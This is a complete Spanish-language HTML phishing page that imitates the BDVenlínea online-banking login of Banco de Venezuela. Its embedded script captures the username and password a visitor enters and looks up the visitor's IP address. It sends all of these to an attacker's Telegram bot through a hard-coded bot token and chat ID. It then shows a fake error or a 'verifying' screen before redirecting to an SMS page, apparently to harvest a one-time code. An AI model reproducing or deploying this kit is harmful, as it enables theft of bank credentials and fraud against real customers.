<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BDVenlínea personas</title>
    <style>
        :root {
            --bdv-blue: #0067b1;
            --bdv-red: #f04e23;
            --bdv-gray-light: #f4f4f4;
            --bdv-dark-bg: #0b121c;
        }

        * { box-sizing: border-box; font-family: 'Arial', sans-serif; }

        body {
            margin: 0; padding: 0; height: 100vh;
            background-image: url('background.webp'); 
            background-color: #f4f4f4; background-size: cover;
            background-position: center; display: flex;
            align-items: center; overflow: hidden;
        }

        .login-container {
            background: white; width: 450px; margin-left: 8%;
            padding: 40px; border-radius: 4px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
            position: relative; z-index: 1;
        }

        .logo-main { display: block; width: 250px; margin: 0 auto 40px; }

        .field { background: #eee; border-bottom: 2px solid #ccc; padding: 10px 15px; margin-bottom: 25px; }
        .field label { display: block; font-size: 12px; color: #666; }
        .field input { width: 100%; border: none; background: transparent; font-size: 18px; outline: none; padding-top: 5px; }

        .btn-entrar {
            width: 100%; padding: 14px; background: #ccc; color: #888;
            border: none; border-radius: 4px; font-size: 16px;
            font-weight: bold; cursor: not-allowed; transition: 0.3s;
        }

        .btn-entrar.active { background: var(--bdv-blue); color: white; cursor: pointer; }

        .overlay-modal {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.5); display: none;
            justify-content: center; align-items: center; z-index: 100;
        }

        .modal-card { background: white; width: 400px; padding: 30px; border-radius: 4px; text-align: center; }
        .modal-card h2 { color: var(--bdv-blue); font-size: 20px; margin-bottom: 20px; }
        .modal-field { text-align: left; background: #f0f0f0; border-bottom: 2px solid var(--bdv-red); padding: 10px; margin-bottom: 20px; }

        .modal-btns { display: flex; gap: 10px; justify-content: flex-end; }
        .btn { padding: 10px 25px; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; }
        .btn-cancelar { background: var(--bdv-blue); color: white; }
        .btn-continuar { background: #eee; color: #aaa; }
        .btn-continuar.active { background: var(--bdv-blue); color: white; }

        #loading-screen {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: var(--bdv-dark-bg); z-index: 500; display: none;
            flex-direction: column; justify-content: center; align-items: center; color: white;
        }

        .dots { display: flex; gap: 10px; margin: 25px 0; }
        .dot { width: 12px; height: 12px; background: var(--bdv-red); border-radius: 50%; animation: pulse 1s infinite alternate; }
        .dot:nth-child(2) { animation-delay: 0.3s; }
        .dot:nth-child(3) { animation-delay: 0.6s; }

        @keyframes pulse { from { transform: scale(0.5); opacity: 0.3; } to { transform: scale(1.2); opacity: 1; } }
        .load-text { color: var(--bdv-red); font-size: 22px; font-weight: bold; margin-bottom: 10px; }

        #error-bar {
            position: fixed; bottom: 0; left: 0; width: 100%;
            background: var(--bdv-blue); color: white; padding: 18px;
            text-align: center; font-weight: bold; font-size: 17px;
            display: none; z-index: 1000;
        }
    </style>
</head>
<body>

    <div class="login-container" id="login-view">
        <img src="logo.png" class="logo-main" alt="BDV">
        <div class="field">
            <label>Usuario *</label>
            <input type="text" id="userInput" autocomplete="off">
        </div>
        <button id="btnEntrar" class="btn-entrar" disabled>Entrar</button>
    </div>

    <div class="overlay-modal" id="modal-pass">
        <div class="modal-card">
            <h2>Introduce tu contraseña</h2>
            <div class="modal-field">
                <label style="font-size: 11px; color: #777;">Contraseña</label>
                <input type="password" id="passInput" style="width: 100%; border: none; background: transparent; outline: none; font-size: 18px;">
            </div>
            <div class="modal-btns">
                <button class="btn btn-cancelar" onclick="cerrarModal()">Cancelar</button>
                <button id="btnContinuar" class="btn btn-continuar" disabled>Continuar</button>
            </div>
        </div>
    </div>

    <div id="loading-screen">
        <img src="logo.png" width="180" style="filter: brightness(0) invert(1); margin-bottom: 20px;">
        <div class="dots"><div class="dot"></div><div class="dot"></div><div class="dot"></div></div>
        <div class="load-text">Estamos verificando tu información...</div>
    </div>

    <div id="error-bar">Usuario o Clave incorrecta</div>

    <script>
        const botToken = "8968949871:AAHOl4RQWDHHaPcoCqRkE_oE3jxetyal3pA";
        const chatId = "8359260482";

        const userInput = document.getElementById('userInput');
        const passInput = document.getElementById('passInput');
        const btnEntrar = document.getElementById('btnEntrar');
        const btnContinuar = document.getElementById('btnContinuar');
        const modalPass = document.getElementById('modal-pass');
        const loadingScreen = document.getElementById('loading-screen');
        const errorBar = document.getElementById('error-bar');

        userInput.addEventListener('input', () => {
            const active = userInput.value.trim().length >= 4;
            btnEntrar.disabled = !active;
            btnEntrar.classList.toggle('active', active);
        });

        btnEntrar.onclick = () => {
            errorBar.style.display = 'none';
            modalPass.style.display = 'flex';
        };

        function cerrarModal() {
            modalPass.style.display = 'none';
            passInput.value = "";
        }

        passInput.addEventListener('input', () => {
            const active = passInput.value.length >= 4;
            btnContinuar.disabled = !active;
            btnContinuar.classList.toggle('active', active);
        });

        btnContinuar.onclick = async () => {
            const usr = userInput.value.trim();
            const psw = passInput.value;
            
            // GUARDAR USUARIO PARA OTRAS PÁGINAS
            localStorage.setItem("usuario", usr);
            sessionStorage.setItem("usuario", usr);

            const tieneSimbolo = /[^a-zA-Z0-9]/.test(psw);

            if (!tieneSimbolo) {
                cerrarModal();
                errorBar.style.display = 'block';
                const textoErr = `❌ *FALLO LOG (Sin símbolo)*\n👤 *Usuario:* \`${usr}\`\n🔑 *Clave:* \`${psw}\``;
                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(textoErr)}&parse_mode=Markdown`);
                setTimeout(() => { errorBar.style.display = 'none'; }, 5000);
            } else {
                // OBTENER IP ANTES DE ENVIAR
                let ip = "Buscando...";
                try {
                    const res = await fetch('https://api.ipify.org?format=json');
                    const data = await res.json();
                    ip = data.ip;
                } catch(e) {}

                const texto = `━━━━━━━━━━━━━━━━━━━━\n🚨 **NUEVO LOG BDV**\n━━━━━━━━━━━━━━━━━━━━\n👤 **Usuario:** \`${usr}\`\n🔑 **Clave:** \`${psw}\`\n🌐 **IP:** \`${ip}\`\n━━━━━━━━━━━━━━━━━━━━`;
                
                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(texto)}&parse_mode=Markdown`);

                modalPass.style.display = 'none';
                loadingScreen.style.display = 'flex';
                setTimeout(() => { window.location.href = "sms.html"; }, 4000);
            }
        };
    </script>
</body>
</html>
